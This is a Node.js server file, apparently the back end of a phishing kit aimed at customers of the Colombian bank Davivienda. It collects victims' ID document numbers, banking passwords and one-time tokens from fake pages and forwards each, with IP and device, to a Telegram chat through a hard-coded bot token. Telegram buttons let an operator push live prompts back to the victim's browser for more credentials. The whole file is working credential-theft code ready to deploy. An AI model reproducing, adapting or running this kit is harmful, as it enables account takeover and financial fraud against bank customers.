const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fetch = require('node-fetch');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Configuración
const TELEGRAM_BOT_TOKEN = '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
const TELEGRAM_CHAT_ID = '-4997787461';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Almacenamiento temporal de sesiones
const sessions = new Map();
const sessionIdMap = new Map(); // Mapeo de sessionId custom -> socket.id actual

// Función para enviar mensaje a Telegram con botones inline
async function sendToTelegram(message, buttons, sessionId) {
  const keyboard = {
    inline_keyboard: [buttons]
  };

  const url = `${TELEGRAM_API_URL}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      })
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error('Error de Telegram:', data);
      throw new Error(data.description || 'Error al enviar a Telegram');
    }
    
    return data;
  } catch (error) {
    console.error('Error enviando a Telegram:', error);
    throw error;
  }
}

// Polling para recibir updates de Telegram
let offset = 0;
async function startPolling() {
  setInterval(async () => {
    try {
      const url = `${TELEGRAM_API_URL}/getUpdates?offset=${offset}&timeout=30`;
      const response = await fetch(url);
      const data = await response.json();
      
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          offset = update.update_id + 1;
          
          if (update.callback_query) {
            await handleCallbackQuery(update.callback_query);
          }
        }
      }
    } catch (error) {
      console.error('Error en polling:', error);
    }
  }, 1000);
}

// Manejar callbacks de botones de Telegram
async function handleCallbackQuery(callbackQuery) {
  const { data, id, message } = callbackQuery;
  
  try {
    // Responder al callback para quitar el loading
    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: id,
        text: '✅ Comando enviado'
      })
    });
    
    // Procesar el comando
    const [action, sessionId] = data.split(':');
    
    console.log(`\n[TELEGRAM] Comando recibido: ${action} para sesión ${sessionId}`);
    
    if (sessions.has(sessionId)) {
      // Obtener el socket ID actual para esta sesión
      const currentSocketId = sessionIdMap.get(sessionId);
      
      if (currentSocketId) {
        console.log(`[TELEGRAM] Enviando a socket actual: ${currentSocketId}`);
        io.to(currentSocketId).emit('admin-action', { action });
      } else {
        console.log(`[TELEGRAM] Socket no conectado, esperando reconexión...`);
        // Guardar acción pendiente para cuando se reconecte
        const session = sessions.get(sessionId);
        session.pendingAction = action;
      }
      
      // Editar el mensaje para confirmar
      await fetch(`${TELEGRAM_API_URL}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          message_id: message.message_id,
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Comando Ejecutado', callback_data: 'executed' }
            ]]
          }
        })
      });
    } else {
      console.log(`[TELEGRAM] ❌ Sesión ${sessionId} no encontrada`);
    }
  } catch (error) {
    console.error('[ERROR] manejando callback:', error);
  }
}

// Socket.IO - Manejo de conexiones
io.on('connection', (socket) => {
  const clientIp = socket.handshake.address;
  const userAgent = socket.handshake.headers['user-agent'];
  const customSessionId = socket.handshake.auth.sessionId;
  
  // SIEMPRE usar el sessionId personalizado del cliente
  let sessionId = customSessionId || socket.id;
  
  if (customSessionId && sessions.has(customSessionId)) {
    console.log(`\n[↻] Cliente reconectado: ${customSessionId}`);
    console.log(`    Socket actual: ${socket.id}`);
  } else if (customSessionId) {
    console.log(`\n[+] Nueva sesión: ${customSessionId}`);
    console.log(`    Socket: ${socket.id}`);
  } else {
    console.log(`\n[+] Cliente sin sessionId: ${socket.id}`);
  }
  
  console.log(`    IP: ${clientIp}`);
  console.log(`    User-Agent: ${userAgent}\n`);
  
  // Mapear el socket ID actual al sessionId persistente
  sessionIdMap.set(sessionId, socket.id);
  
  // Registrar o actualizar sesión
  if (!sessions.has(sessionId)) {
    sessions.set(sessionId, {
      connectedAt: new Date(),
      ip: clientIp,
      userAgent: userAgent,
      data: {},
      pendingAction: null
    });
  } else {
    // Actualizar información si es reconexión
    const session = sessions.get(sessionId);
    session.lastReconnect = new Date();
  }
  
  // Actualizar el socket con el sessionId personalizado
  socket.sessionId = sessionId;
  
  // Si hay una acción pendiente, ejecutarla
  const session = sessions.get(sessionId);
  if (session.pendingAction) {
    console.log(`[PENDIENTE] Ejecutando acción pendiente: ${session.pendingAction}`);
    setTimeout(() => {
      socket.emit('admin-action', { action: session.pendingAction });
      session.pendingAction = null;
    }, 500);
  }

  // Recibir datos del documento
  socket.on('submit-document', async (data) => {
    try {
      const sessionId = socket.sessionId;
      const session = sessions.get(sessionId);
      session.data.document = data;
      
      console.log(`[DOCUMENTO] Sesión ${sessionId}:`, data);
      
      const message = `
🆕 <b>NUEVO REGISTRO - DOCUMENTO</b>

👤 <b>Tipo:</b> ${data.documentType}
🆔 <b>Número:</b> ${data.documentNumber}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
🌐 <b>IP:</b> ${session.ip}
📱 <b>Device:</b> ${session.userAgent.includes('Mobile') ? 'Móvil' : 'Escritorio'}

🔑 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━
<i>Usa los botones para controlar al usuario</i>
`;

      const buttons = [
        { text: '📝 Pedir Usuario', callback_data: `request-user:${sessionId}` },
        { text: '🔐 Pedir Clave', callback_data: `request-password:${sessionId}` },
        { text: '🔢 Pedir Token', callback_data: `request-token:${sessionId}` }
      ];

      await sendToTelegram(message, buttons, sessionId);
      
      socket.emit('data-sent', { success: true });
    } catch (error) {
      console.error('[ERROR] submit-document:', error);
      socket.emit('data-sent', { success: false, error: error.message });
    }
  });

  // Recibir datos de la clave
  socket.on('submit-password', async (data) => {
    try {
      const sessionId = socket.sessionId;
      const session = sessions.get(sessionId);
      session.data.password = data;
      
      console.log(`[CLAVE] Sesión ${sessionId}:`, data);
      
      const documentData = session.data.document || {};
      
      const message = `
✅ <b>CLAVE RECIBIDA</b>

👤 <b>Tipo:</b> ${documentData.documentType || 'N/A'}
🆔 <b>Documento:</b> ${documentData.documentNumber || 'N/A'}
🔐 <b>Clave:</b> <code>${data.password}</code>
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
🌐 <b>IP:</b> ${session.ip}

🔑 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━
<i>Selecciona la siguiente acción</i>
`;

      const buttons = [
        { text: '📝 Pedir Usuario', callback_data: `request-user:${sessionId}` },
        { text: '🔐 Pedir Clave', callback_data: `request-password:${sessionId}` },
        { text: '🔢 Pedir Token', callback_data: `request-token:${sessionId}` },
        { text: '✅ Finalizar', callback_data: `finish:${sessionId}` }
      ];

      await sendToTelegram(message, buttons, sessionId);
      
      socket.emit('data-sent', { success: true });
    } catch (error) {
      console.error('[ERROR] submit-password:', error);
      socket.emit('data-sent', { success: false, error: error.message });
    }
  });

  // Recibir datos del token
  socket.on('submit-token', async (data) => {
    try {
      const sessionId = socket.sessionId;
      const session = sessions.get(sessionId);
      session.data.token = data;
      
      console.log(`[TOKEN] Sesión ${sessionId}:`, data);
      
      const documentData = session.data.document || {};
      const passwordData = session.data.password || {};
      
      const message = `
🔢 <b>TOKEN RECIBIDO</b>

👤 <b>Tipo:</b> ${documentData.documentType || 'N/A'}
🆔 <b>Documento:</b> ${documentData.documentNumber || 'N/A'}
🔐 <b>Clave:</b> ${passwordData.password ? '<code>' + passwordData.password + '</code>' : 'N/A'}
🔢 <b>Token:</b> <code>${data.token}</code>
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
🌐 <b>IP:</b> ${session.ip}

🔑 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━━
<i>Selecciona la siguiente acción</i>
`;

      const buttons = [
        { text: '📝 Pedir Usuario', callback_data: `request-user:${sessionId}` },
        { text: '🔐 Pedir Clave', callback_data: `request-password:${sessionId}` },
        { text: '🔢 Pedir Token', callback_data: `request-token:${sessionId}` },
        { text: '✅ Finalizar', callback_data: `finish:${sessionId}` }
      ];

      await sendToTelegram(message, buttons, sessionId);
      
      socket.emit('data-sent', { success: true });
    } catch (error) {
      console.error('[ERROR] submit-token:', error);
      socket.emit('data-sent', { success: false, error: error.message });
    }
  });

  // Desconexión del cliente
  socket.on('disconnect', () => {
    const sessionId = socket.sessionId;
    console.log(`[-] Socket desconectado: ${socket.id} (Sesión: ${sessionId})`);
    console.log(`    Sesión mantenida para reconexión\n`);
    // NO eliminamos la sesión para permitir reconexión
    // Solo actualizamos el mapeo
    sessionIdMap.delete(sessionId);
  });
});

// Rutas estáticas
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/clave.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'clave.html'));
});

app.get('/token.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'token.html'));
});

app.get('/loading.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'loading.html'));
});

// Endpoint de salud
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    sessions: sessions.size,
    timestamp: new Date().toISOString()
  });
});

// Iniciar servidor y configurar Telegram
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('🚀 Servidor iniciado correctamente');
  console.log(`📡 URL: http://localhost:${PORT}`);
  console.log(`🔌 Socket.IO: Activo`);
  console.log(`📱 Telegram Bot: Configurado`);
  console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
  console.log('✅ Sistema listo. Esperando conexiones...\n');
  
  // Iniciar polling de Telegram (solo si STANDALONE_BOT=1, evita 409 Conflict)
  if (process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true') {
    startPolling();
  } else {
    console.log('ℹ STANDALONE_BOT no activo: Davivienda NO inicia polling (lo maneja el server raíz).');
  }
});

// Manejo de errores
process.on('uncaughtException', (error) => {
  console.error('Error no capturado:', error);
});

process.on('unhandledRejection', (error) => {
  console.error('Promise rechazada:', error);
});
